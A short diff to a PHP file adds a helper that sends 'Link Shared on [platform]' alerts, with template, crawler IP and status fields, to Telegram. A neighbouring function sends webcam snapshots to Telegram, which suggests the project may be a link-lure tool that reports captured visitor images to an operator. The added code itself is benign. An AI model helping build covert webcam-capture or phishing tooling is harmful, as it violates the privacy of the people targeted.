@@ -163,6 +163,19 @@ function sendTelegramAlert(string $title, array $fields = []): bool
 }
 
 /**
+ * Send a dedicated Link Share / Preview alert card to Telegram.
+ *
+ * @param  string $platform   Platform name (e.g. "WhatsApp", "Telegram", "SMS / Text Message")
+ * @param  array  $details    Key-value pairs (Template, Crawler IP, Action, Status, Time)
+ * @return bool               True on success
+ */
+function sendTelegramShareAlert(string $platform, array $details = []): bool
+{
+    $title = "🔗 Link Shared on " . $platform;
+    return sendTelegramAlert($title, $details);
+}
+
+/**
  * Send an image / webcam snapshot directly to Telegram as a photo card.
  *
  * @param  string $filepath Absolute path to image file
